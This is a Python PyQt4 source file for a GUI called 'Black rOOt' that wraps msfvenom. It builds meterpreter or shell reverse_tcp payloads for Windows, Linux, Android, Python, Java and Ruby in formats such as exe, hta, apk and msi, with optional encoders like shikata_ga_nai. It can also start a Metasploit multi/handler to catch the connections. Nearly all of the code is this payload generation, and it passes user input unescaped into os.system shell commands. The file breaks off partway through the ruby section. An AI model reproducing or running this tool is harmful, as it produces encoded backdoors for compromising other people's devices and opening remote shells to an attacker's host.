try:
	import os
	import sys
	from PyQt4.QtCore import *
	from PyQt4.QtGui import *
	class Application0():
		def Application00(self):
			###########################(Application)######################
			self.Application = (QApplication(sys.argv))
			###########################(Application)######################
			#############################(window)#########################
			self.window = (QWidget())
			self.window.resize(500,300)
			self.window.setWindowTitle("Black rOOt")
			#####################################################{Line Edit}
			#host
			self.lhost = QLineEdit(self.window)
			self.lhost.move(280,60)
			self.lhost.resize(200,35)
			self.lhost.setPlaceholderText("127.0.0.1")
			#self.lhost.text()
			#port
			self.lport = QLineEdit(self.window)
			self.lport.move(280 ,120)
			self.lport.resize(200,35)
			self.lport.setPlaceholderText("4444")
			#self.lport.text()
			# save
			self.save = QLineEdit(self.window)
			self.save.move(280 ,180)
			self.save.resize(200,35)
			self.save.setPlaceholderText("Saved as /root/Name")
			#self.save.text()
			####################################################{Combo Box}
			#platforms
			self.platforms = QComboBox(self.window)
			self.platforms.resize(200,35)
			self.platforms.move(35 ,60)
			self.platforms.addItem("windows")
			self.platforms.addItem("linux")
			self.platforms.addItem("android")
			self.platforms.addItem("python")
			self.platforms.addItem("java")
			self.platforms.addItem("ruby")
			#self.platforms.currentText()
			#payload
			self.payload = QComboBox(self.window)
			self.payload.resize(200,35)
			self.payload.move(35 ,120)
			self.payload.addItem("meterpreter")
			self.payload.addItem("shell")
			#self.payload.currentText()
			#formats
			self.formats = QComboBox(self.window)
			self.formats.resize(200,35)
			self.formats.move(35 ,180)
			self.formats.addItem("exe") # good
			self.formats.addItem("bat") # good
			self.formats.addItem("hta") # good
			self.formats.addItem("py") # good
			self.formats.addItem("rb") # good
			self.formats.addItem("java") # good
			self.formats.addItem("jar") # good
			self.formats.addItem("apk") # good
			self.formats.addItem("dll") # good
			self.formats.addItem("elf") # good
			self.formats.addItem("msi") # good
			self.formats.addItem("psh") # good
			#self.formats.currentText()
			#encoder
			self.encoder = QComboBox(self.window)
			self.encoder.resize(200,35)
			self.encoder.move(35 ,240)
			self.encoder.addItem("none")
			self.encoder.addItem("cmd/echo")
			self.encoder.addItem("cmd/generic_sh")
			self.encoder.addItem("cmd/ifs")
			self.encoder.addItem("cmd/perl")
			self.encoder.addItem("cmd/powershell_base64")
			self.encoder.addItem("cmd/printf_php_mq")
			self.encoder.addItem("generic/eicar")
			self.encoder.addItem("generic/none")
			self.encoder.addItem("mipsbe/byte_xori")
			self.encoder.addItem("mipsbe/longxor")
			self.encoder.addItem("mipsle/byte_xori")
			self.encoder.addItem("mipsle/longxor")
			self.encoder.addItem("php/base64")
			self.encoder.addItem("ppc/longxor")
			self.encoder.addItem("ppc/longxor_tag")
			self.encoder.addItem("sparc/longxor_tag")
			self.encoder.addItem("x64/xor")
			self.encoder.addItem("x64/zutto_dekiru")
			self.encoder.addItem("x86/add_sub")
			self.encoder.addItem("x86/alpha_mixed")
			self.encoder.addItem("x86/alpha_upper")
			self.encoder.addItem("x86/avoid_underscore_tolower")
			self.encoder.addItem("x86/avoid_utf8_tolower")
			self.encoder.addItem("x86/bloxor")
			self.encoder.addItem("x86/bmp_polyglot")
			self.encoder.addItem("x86/call4_dword_xor")
			self.encoder.addItem("x86/context_cpuid")
			self.encoder.addItem("x86/context_stat")
			self.encoder.addItem("x86/context_time")
			self.encoder.addItem("x86/countdown")
			self.encoder.addItem("x86/fnstenv_mov")
			self.encoder.addItem("x86/jmp_call_additive")
			self.encoder.addItem("x86/nonalpha")
			self.encoder.addItem("x86/nonupper")
			self.encoder.addItem("x86/opt_sub")
			self.encoder.addItem("x86/service")
			self.encoder.addItem("x86/shikata_ga_nai")
			self.encoder.addItem("x86/single_static_bit")
			self.encoder.addItem("x86/unicode_mixed")
			self.encoder.addItem("x86/unicode_upper")
			#self.encoder.currentText()
			###################################################{Button}
			#generate payload
			def windows():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "exe":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "bat": #powershell
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "hta": #hta-psh
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "dll": #dll
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "msi": #msi
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "psh": #psh
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				##############################################################################################################################################################################################################################################################################################################################################
				elif self.formats.currentText() == "exe":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "bat":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "hta":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh  -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "dll":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "msi":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "psh":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
			##################################################################################################
			def linux():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "elf":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				###########################################################################################################################################################################################################################################################################################
				elif self.formats.currentText() == "elf":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
			###################################################################################################
			def android():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "apk":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "apk":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
			###################################################################################################
			def python():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "py":
						if self.payload.currentText() == "shell":
							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
								if runmetasploit == QMessageBox.Yes:
									os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
							else:
								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
						elif self.payload.currentText() == "meterpreter":
							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
								if runmetasploit == QMessageBox.Yes:
									os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
							else:
								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "py":
					if self.payload.currentText() == "shell":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.payload.currentText() == "meterpreter":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
			###################################################################################################
			def java():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "java":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.formats.currentText() == "jar":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "java":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				elif self.formats.currentText() == "jar":
					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					os.system("clear")
					if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
						if runmetasploit == QMessageBox.Yes:
							os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
					else:
						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
			####################################################################################################
			def ruby():
				if self.encoder.currentText() == "none":
					if self.formats.currentText() == "rb":
						if self.payload.currentText() == "shell":
							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							os.system("clear")
							if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
